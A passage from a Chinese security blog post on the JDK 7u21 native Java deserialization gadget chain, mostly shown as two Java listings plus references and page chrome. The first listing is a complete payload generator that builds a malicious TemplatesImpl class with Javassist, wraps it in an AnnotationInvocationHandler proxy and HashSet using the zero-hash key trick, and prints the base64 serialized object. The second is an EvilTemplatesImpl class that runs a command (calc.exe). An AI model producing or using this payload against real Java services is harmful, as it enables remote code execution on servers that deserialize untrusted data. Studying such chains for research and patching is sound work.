+<p><strong>Jdk7u21 HashSet版本</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//创建恶意class</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Str3am"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc.exe\");"</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        ((CtClass) cc).makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"EvilCat"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//设置父类为AbstractTranslet</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"> </span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"> </span><br><span class="line"><span class="comment">//        TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates, "_bytecodes", new byte[][]&#123;</span></span><br><span class="line"><span class="comment">//                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span></span><br><span class="line"><span class="comment">//        &#125;);</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates, "_name", "HelloTemplatesImpl");</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());</span></span><br><span class="line"> </span><br><span class="line">        String zeroHashCodeStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, <span class="string">"foo"</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 实例化AnnotationInvocationHandler类</span></span><br><span class="line">        Constructor handlerConstructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        handlerConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 为tempHandler创造一层代理</span></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(App.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 实例化HashSet，并将两个对象放进去</span></span><br><span class="line">        HashSet set = <span class="keyword">new</span> HashSet();</span><br><span class="line">        set.add(proxy);</span><br><span class="line">        set.add(templates);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 将恶意templates设置到map中</span></span><br><span class="line">        map.put(zeroHashCodeStr, templates);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            ObjectOutputStream obout = new ObjectOutputStream(new FileOutputStream("out.bin"));</span></span><br><span class="line"><span class="comment">//            obout.writeObject(set);</span></span><br><span class="line"><span class="comment">//            ObjectInputStream obin = new ObjectInputStream(new FileInputStream("out.bin"));</span></span><br><span class="line"><span class="comment">//            obin.readObject();</span></span><br><span class="line"><span class="comment">//        &#125; catch (Exception e)&#123;</span></span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"> </span><br><span class="line">        ByteArrayOutputStream baout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream obout = <span class="keyword">new</span> ObjectOutputStream(baout);</span><br><span class="line">        obout.writeObject(set);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> BASE64Encoder().encode(baout.toByteArray()).replaceAll(<span class="string">"[\\s*\t\n\r]"</span>, <span class="string">""</span>));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>EvilTemplatesImpl.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        System.out.println(<span class="string">"Hello TemplatesImpl"</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><p><a href="https://mp.weixin.qq.com/s/qlg3IzyIc79GABSSUyt-OQ" target="_blank" rel="noopener">Java反序列化系列 ysoserial Jdk7u21</a></p>
+</li>
+<li><p><a href="https://github.com/phith0n/JavaThings/blob/master/general/src/main/java/com/govuln/deserialization/JDK7u21.java" target="_blank" rel="noopener">JDK7u21.java</a></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Str3am
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://jlkl.github.io/2021/08/21/Java_05/" title="Jdk7u21 原生反序列化链">https://jlkl.github.io/2021/08/21/Java_05/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/28/Web_19/" rel="prev" title="Shiro Vulnerability">
+      <i class="fa fa-chevron-left"></i> Shiro Vulnerability
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用链"><span class="nav-number">1.</span> <span class="nav-text">利用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用链分析"><span class="nav-number">2.</span> <span class="nav-text">利用链分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试代码"><span class="nav-number">3.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞修复"><span class="nav-number">4.</span> <span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DASCTF-July-easyjava"><span class="nav-number">5.</span> <span class="nav-text">DASCTF July easyjava</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Str3am"
+      src="/images/Str3am.jpg">
+  <p class="site-author-name" itemprop="name">Str3am</p>
+  <div class="site-description" itemprop="description">这个人很懒，什么也没留下</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jlkl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jlkl" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:str3am@qq.com" title="E-Mail → mailto:str3am@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Friends
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://0xmj.github.io/" title="http:&#x2F;&#x2F;0xmj.github.io&#x2F;" rel="noopener" target="_blank">Mang0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/sn1per/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;sn1per&#x2F;" rel="noopener" target="_blank">Sn1per</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.siriyang.cn/" title="https:&#x2F;&#x2F;blog.siriyang.cn&#x2F;" rel="noopener" target="_blank">Siriyang</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Str3am</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">306k</span>
+</div> 
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment-precise-range-plugin@1.3.0/moment-precise-range.min.js"></script>
+<script>
+  function timer() {
+    var ages = moment.preciseDiff(moment(),moment(20200108,"YYYYMMDD"));
+    ages = ages.replace(/years?/, "年");
+    ages = ages.replace(/months?/, "月");
+    ages = ages.replace(/days?/, "天");
+    ages = ages.replace(/hours?/, "小时");
+    ages = ages.replace(/minutes?/, "分");
+    ages = ages.replace(/seconds?/, "秒");
+    ages = ages.replace(/\d+/g, '<span style="color:#1890ff">$&</span>');
+    div.innerHTML = `我已在此等候你 ${ages}`;
+  }
+  var div = document.createElement("div");
+  //插入到copyright之后
+  var copyright = document.querySelector(".copyright");
+  document.querySelector(".footer-inner").insertBefore(div, copyright.nextSibling);
+  timer();
+  setInterval("timer()",1000)
+</script>
+
+
+
+
+  <script async src="/js/cursor/love.min.js"></script>
+
+
+
+
+  <script src="/js/cursor/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+        <span class="site-uv" title="我的第  undefined  位朋友，">
+          <span id="busuanzi_value_site_uv"></span>
+        </span>
+      -->
+      <span class="site-uv">
+     我的第  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_uv"></span>  位朋友，
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+        <span class="site-pv" title="历经  undefined  次回眸才与你相遇">
+          <span id="busuanzi_value_site_pv"></span>
+        </span>
+      -->
+      <span class="site-pv">
+     历经  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_pv"></span>  次回眸才与你相遇
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el: '#valine-comments',
+      verify: true,
+      notify: true,
+      appId: '3IVY8n0VhhMlAUHBsp34Pxx7-gzGzoHsz',
+      appKey: 'DjdjX2sAzBG2G1G5c6amlBnv',
+      placeholder: "Just go go",
+      avatar: 'mm',
+      meta: guest,
+      pageSize: '10' || 10,
+      visitor: false,
+      lang: 'en' || 'zh-cn',
+      path: location.pathname,
+      recordIP: true,
+      serverURLs: ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
